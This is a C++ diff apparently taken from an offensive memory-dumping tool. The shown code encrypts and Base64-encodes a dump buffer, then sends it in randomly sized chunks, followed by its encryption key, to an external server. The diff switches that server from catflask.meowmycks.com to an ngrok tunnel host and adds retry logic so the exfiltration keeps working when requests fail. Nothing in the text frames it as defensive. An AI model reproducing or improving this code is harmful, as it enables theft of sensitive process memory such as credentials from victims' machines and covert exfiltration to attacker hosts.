@@ -340,14 +340,32 @@ void SendDataInChunks(const std::string& data, const std::string& hostname, cons
 	size_t offset = 0;
 	size_t totalSize = data.size();
 	size_t sequenceNumber = 0;
+	const int maxRetries = 3; // Maximum number of retries for a request
 
 	while (offset < totalSize) {
 		size_t chunkSize = std::min<size_t>(sizeDist(gen), totalSize - offset);
         std::string chunk = data.substr(offset, chunkSize);
 
+		/*
         if (!SendHTTPSRequest(hostname, path, chunk)) {
             // Handle error
         }
+		*/
+		bool requestSuccessful = false;
+		for (int attempt = 0; attempt < maxRetries && !requestSuccessful; ++attempt) {
+			if (SendHTTPSRequest(hostname, path, chunk)) {
+				requestSuccessful = true;
+			}
+			else {
+				// Add a delay between retries
+				std::this_thread::sleep_for(std::chrono::seconds(1));
+			}
+		}
+
+		if (!requestSuccessful) {
+			// Handle the case where all retries failed
+			// Might want to log this event, abort the operation, or take some other action
+		}
 
         offset += chunkSize;
         sequenceNumber++;
@@ -417,13 +435,13 @@ int main() {
 		std::string key = Keygen(numRNG());
 		std::string data = Base64Encode(EncryptDump(dumpBuffer, bytesRead, key));
 
-		SendDataInChunks(data, "catflask.meowmycks.com", "/upload");
-		SendHTTPSRequest("catflask.meowmycks.com", "/upload", key, true);
+		//SendDataInChunks(data, "catflask.meowmycks.com", "/upload");
+		SendDataInChunks(data, "30f7-154-47-22-66.ngrok-free.app", "/upload");
+		//SendHTTPSRequest("catflask.meowmycks.com", "/upload", key, true);
+		SendHTTPSRequest("30f7-154-47-22-66.ngrok-free.app", "/upload", key, true);
 	}
-	else {
-		// wtf happened???
+	else // wtf happened???
 		std::wcout << L"Dump failed. " << err << std::endl;
-	}
 
 	// Clean-up
 	HeapFree(GetProcessHeap(), 0, dumpBuffer);
